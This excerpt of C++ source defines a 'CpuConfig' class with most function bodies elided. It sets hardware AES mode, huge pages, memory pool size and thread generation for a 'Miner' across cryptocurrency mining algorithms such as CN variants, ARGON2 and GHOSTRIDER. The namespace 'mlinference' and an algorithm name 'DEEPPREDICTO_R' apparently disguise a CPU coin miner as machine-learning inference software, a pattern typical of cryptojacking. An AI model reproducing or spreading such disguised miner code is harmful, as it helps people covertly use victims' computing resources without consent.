...
bool mlinference::CpuConfig::isHwAES() const
{
    return (m_aes == AES_AUTO ? (Cpu::info()->hasAES() ? AES_HW : AES_SOFT) : m_aes) == AES_HW;
}


rapidjson::Value mlinference::CpuConfig::toJSON(rapidjson::Document &doc) const
{
...
size_t mlinference::CpuConfig::memPoolSize() const
{
    return m_memoryPool < 0 ? std::max(Cpu::info()->threads(), Cpu::info()->L3() >> 21) : m_memoryPool;
}


std::vector<mlinference::CpuLaunchData> mlinference::CpuConfig::get(const Miner *miner, const Algorithm &algorithm) const
{
...
void mlinference::CpuConfig::read(const rapidjson::Value &value)
{
    if (value.IsObject()) {
...
void mlinference::CpuConfig::generate()
{
    ...
    count += mlinference::generate<Algorithm::CN>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::CN_LITE>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::CN_HEAVY>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::CN_PICO>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::CN_FEMTO>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::DEEPPREDICTO_R>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::ARGON2>(m_threads, m_limit);
    count += mlinference::generate<Algorithm::GHOSTRIDER>(m_threads, m_limit);

    m_shouldSave |= count > 0;
}


void mlinference::CpuConfig::setAesMode(const rapidjson::Value &value)
{
    if (value.IsBool()) {
...
void mlinference::CpuConfig::setHugePages(const rapidjson::Value &value)
{
    if (value.IsBool()) {
...
void mlinference::CpuConfig::setMemoryPool(const rapidjson::Value &value)
{
    if (value.IsBool()) {
